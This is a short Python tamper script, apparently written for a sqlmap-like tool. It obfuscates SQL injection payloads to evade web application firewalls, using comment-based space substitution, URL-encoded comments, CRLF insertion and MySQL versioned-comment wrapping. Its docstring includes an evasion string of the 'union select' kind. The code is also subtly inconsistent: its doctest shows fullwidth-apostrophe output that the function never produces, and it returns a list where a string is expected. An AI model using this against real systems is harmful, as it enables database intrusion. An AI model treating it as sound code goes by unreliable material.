import re

from main_modules.settings import PRIORITY
__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """

    /*! our_string */
    /**/our_string/**/
    /%2A%2A/union/%2A%2A/select/%2A%2A/
    replace space to %0d%0a

    >>> tamper("1 AND '1'='1")
    '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
    """
    result=[]
    result.append(re.sub(r"[\s+]",'/**/',payload))
    result.append(re.sub(r"[\s+]",'/%2A%2A/',payload))
    result.append(re.sub(r"[\s+]",'%0d%0a',payload))

# all string to comments(this out first brackets)
    if re.search('^\w',payload):
        result.append('/*!'+payload+'*/')
    elif re.search('\W',payload):
        i=0
        string=''
        while re.search('\W',payload[i]):
            string=string+payload[i]
            i+=1
        string=string+'/*!'+payload[i:]+'*/'
        result.append(string)
        

# all words to comments
    string=re.sub(r"\w*",convert_this,str(payload))
    result.append(string)


    return result if payload else payload

def convert_this(string):
    string=string.group()
    string='/*!'+string+'*/'
    return string
